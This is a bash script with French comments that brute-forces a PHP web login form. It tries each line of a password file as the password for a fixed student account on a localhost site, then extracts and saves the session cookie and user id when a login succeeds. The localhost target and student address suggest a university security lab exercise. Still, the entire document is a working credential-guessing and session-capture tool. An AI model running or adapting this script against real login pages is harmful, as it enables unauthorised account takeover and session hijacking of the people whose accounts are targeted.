#!/bin/bash
if [ "$#" -lt 2 ]; then
    echo "Usage: $0 <server_ip> <password_file>"
    exit 1
fi

SERVER_IP="$1"
PASSWORD_FILE="$2"

# Vérifiez si le fichier de mots de passe existe
if [ ! -f "$PASSWORD_FILE" ]; then
    echo "Password file '$PASSWORD_FILE' not found."
    exit 1
fi

# URL de connexion et email
LOGIN_URL="http://localhost/pages/public/login.php"
EMAIL="student01@insa-cvl.fr"
LOGIN_BTN=""

# Lecture du fichier de mots de passe et test pour chaque mot de passe
while IFS= read -r PASSWORD; do
    echo "Testing password: $PASSWORD"
    
    # Perform login and extract PHPSESSID and redirection URL
    response=$(curl -L -i -X POST "$LOGIN_URL" \
        -d "email=$EMAIL" \
        -d "password=$PASSWORD" \
        -d "login_btn=$LOGIN_BTN")

    # Extraction du PHPSESSID et de l'URL de redirection
    REDIRECT_URL=$(echo "$response" | grep -oP 'location: \K[^\n]+' | head -n 1)
    PHPSESSID=$(echo "$response" | grep -oP 'Set-Cookie: PHPSESSID=\K[^;]+' | head -n 1)

    # Extraction de l'ID utilisateur à partir de l'URL de redirection
    CLEAN_REDIRECT_URL=$(echo "$REDIRECT_URL" | xargs)
    USER_ID=$(echo "$CLEAN_REDIRECT_URL" | grep -oP 'id=\K\d+')

    # Vérifiez si la connexion a réussi
    if [[ -n "$PHPSESSID" && -n "$USER_ID" ]]; then
        echo "Login successful with password: $PASSWORD"
        echo "PHPSESSID: $PHPSESSID, USER_ID: $USER_ID"
        echo "$PHPSESSID" > session_info.txt
        echo "$USER_ID" >> session_info.txt
        exit 0
    fi
done < "$PASSWORD_FILE"

# Si aucun mot de passe ne fonctionne
echo "Login failed for all passwords in the file."
exit 1

